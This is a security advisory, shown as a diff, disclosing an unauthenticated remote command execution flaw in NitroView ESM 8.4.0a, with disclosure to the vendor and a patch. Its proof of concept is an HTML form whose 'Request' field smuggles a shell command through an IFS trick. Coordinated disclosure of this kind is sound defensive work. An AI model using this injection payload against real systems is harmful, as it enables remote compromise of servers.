@@ -1,0 +1,67 @@
+-- Product description:
+NitroView ESM is an enterprise-class security information and event
+management system that identifies, correlates, and remediates threats
+faster than any other SIEM on the market.
+
+-- Problem Description:
+During research it was found that perl module "ess.pm" is prone to
+remote code execution vulnerability due to lack of user input
+validation.
+
+-- Research Environment:
+The vulnerability was found and tested on ESM 8.4.0a (NitroSecurity
+2.6.22.19-24nssmp64 GNU/Linux).
+
+-- Requirements:
+During the research "ESSPMDebug=1" option in
+"/usr/local/ess/CPConsoleServer.cfg" was required. No authentication
+in NitroSecurity ESM was required to successfuly conduct the attack.
+
+-- Technical Details:
+Because of the "system()" call in "ess.pm" module it's possible to
+send specially crafted request to NitroSecurity ESM web interface,
+which results in remote command execution. It's necessery to change
+IFS (Internal Field Separator) to exploit this vulnerability. Probably
+other methods also would work.
+
+-- Proof Of Concept:
+The following code was successfuly executed in testing environment
+(remember to change x.x.x.x to your NitroSecurity ESM IP address for
+testing purposes only):
+
+-- cut --
+<html>
+<pre>
+
+[*] Tested on v8.4.0a "NitroSecurity 2.6.22.19-24nssmp64 GNU/Linux"
+[*] No authentication required
+[*] "ESSPMDebug=1" in "/usr/local/ess/CPConsoleServer.cfg" required
+
+</pre>
+<form action="https://x.x.x.x/ess"; method="POST">
+<input type="text" name="Request" value="A';c='uname:-a';IFS=:;$c>>/tmp/test;'"
+<input type="hidden" name="debug" value="1">
+<input type="submit" value="Oops()">
+</form>
+</html>
+-- cut --
+
+-- Impact:
+Remote code execution in the context of the user running web server.
+
+-- CVSS:
+9, (AV:N/AC:L/Au:N/C:P/I:P/A:C)
+
+-- Disclosure timeline:
+20100922: initial contact with vendor
+20100922: vendor response
+20100923: detailed information about vulnerability and PoC sent to vendor
+20100923: vulnerability confirmed by vendor
+20101008: patch released by vendor
+20101025: security advisory released
+
+-- Credits:
+This bug was found by s_n ;-p
+
+-- Greetz
+K&I, #dragonfly
